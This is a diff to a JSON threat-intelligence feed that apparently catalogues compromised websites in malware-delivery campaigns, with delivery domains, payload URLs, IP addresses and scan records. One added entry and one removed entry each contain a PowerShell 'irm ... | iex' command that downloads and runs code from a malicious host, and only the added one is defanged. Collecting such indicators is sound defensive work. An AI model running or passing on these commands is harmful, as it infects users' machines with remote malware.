@@ -1,5 +1,40 @@
 [
   {
+    "UrlDomain": "creativestarr.com.au",
+    "DeliveryUrl": [
+      "blessedwirrow.org",
+      "rednosehorse.com",
+      "newgoodfoodmarket.com",
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/ben/ae502c3194a7fafa"
+    ],
+    "IP": [
+      "192.254.224.94"
+    ],
+    "Related": [
+      {
+        "Value": "https://blessedwirrow.org/qlzvfjfnsjfacbqafa8yg",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://rednosehorse.com/uacbfrjo2gnlbsxxfj9movpnbuaqo5vu-iz9aeveboe",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://newgoodfoodmarket.com/x5itbyecdrzi2yp1ob1ke046ds2izeg49excr8alhq9",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/ben/ae502c3194a7fafa')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/ben/ae502c3194a7fafa"
+    ],
+    "ReportId": "cmwoszyyl20zt0oml3emqnbu6",
+    "ScannedAt": "2026-11-20T09:55:40.401000+00:00"
+  },
+  {
     "UrlDomain": "hackandslashgames.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -12380,30 +12415,5 @@
     ],
     "ReportId": "cmwdfg5is03uq0oml2mt1nbdk",
     "ScannedAt": "2026-11-12T10:50:52.751000+00:00"
-  },
-  {
-    "UrlDomain": "lockerstoday.com",
-    "DeliveryUrl": [
-      "waysmakeyourlifebetter.com",
-      "goodpersonofourcentury.com",
-      "besthappyfamily.com",
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "160.153.174.190"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/e058fa21b0d6398a",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/e058fa21b0d6398a'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/e058fa21b0d6398a"
-    ],
-    "ReportId": "cmwdd8ni903ki0oml708xi8pf",
-    "ScannedAt": "2026-11-12T09:49:03.263000+00:00"
   }
 ]
